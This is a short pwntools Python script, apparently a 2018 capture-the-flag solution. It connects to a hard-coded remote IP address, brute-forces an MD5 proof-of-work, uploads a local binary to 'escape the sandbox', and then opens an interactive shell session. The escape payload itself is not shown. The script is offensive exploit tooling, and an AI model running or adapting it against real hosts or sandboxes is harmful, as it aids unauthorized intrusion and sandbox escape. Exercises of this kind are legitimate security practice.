#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level = "debug"

import hashlib
import base64
import string
from pwnlib.util.iters import bruteforce
def md5(x):
    return hashlib.md5(x).hexdigest()

with open("./main","r") as f:
    elf = f.read()
pool  = string.printable.replace("\n","")

r = remote("39.105.151.182",9999)
r.recvuntil("key+\"")
key = r.recv(10)
r.recvuntil("==")
ret = r.recv(4)
data = bruteforce(lambda x: md5(x+key)[:4] == ret,method = "downfrom", length = 5,alphabet= pool)
r.sendline(data)
r.recvuntil("escape the sandbox!")
r.sendline(base64.b64encode(elf))
r.recvuntil("[*] Switching to interactive mode\n")
r.interactive()

